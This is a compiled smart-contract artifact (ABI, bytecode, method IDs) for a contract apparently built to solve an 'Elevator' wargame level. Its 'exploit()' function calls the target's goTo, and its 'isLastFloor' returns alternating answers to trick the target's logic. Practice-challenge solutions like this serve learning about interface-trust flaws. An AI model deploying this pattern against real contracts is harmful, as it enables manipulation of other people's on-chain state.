{"abi":[{"type":"constructor","inputs":[{"name":"_elevator","type":"address","internalType":"address"}],"stateMutability":"nonpayable"},{"type":"function","name":"elevator","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"exploit","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"isLastFloor","inputs":[{"name":"_floor","type":"uint256","internalType":"uint256"}],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x6080604052348015600e575f5ffd5b50604051610248380380610248833981016040819052602b91604e565b5f80546001600160a01b0319166001600160a01b03929092169190911790556079565b5f60208284031215605d575f5ffd5b81516001600160a01b03811681146072575f5ffd5b9392505050565b6101c2806100865f395ff3fe608060405234801561000f575f5ffd5b506004361061003f575f3560e01c80635f9a4bca1461004357806363d9b7701461006b578063b0cb4ff014610075575b5f5ffd5b610056610051366004610175565b6100b9565b60405190151581526020015b60405180910390f35b6100736100f5565b005b5f546100949073ffffffffffffffffffffffffffffffffffffffff1681565b60405173ffffffffffffffffffffffffffffffffffffffff9091168152602001610062565b5f8054600160a01b900460ff16156100de5750505f805460ff60a01b19169055600190565b50505f805460ff60a01b1916600160a01b17815590565b5f546040517fed9a7134000000000000000000000000000000000000000000000000000000008152607b600482015273ffffffffffffffffffffffffffffffffffffffff9091169063ed9a7134906024015f604051808303815f87803b15801561015d575f5ffd5b505af115801561016f573d5f5f3e3d5ffd5b50505050565b5f60208284031215610185575f5ffd5b503591905056fea2646970667358221220bcf133ff06ffc971e6a7d34c407686f81f5e3c46ddd29a0ccc02470ec7d8242364736f6c634300081c0033","linkReferences":{}},"methodIdentifiers":{"elevator()":"b0cb4ff0","exploit()":"63d9b770","isLastFloor(uint256)":"5f9a4bca"},"id":0}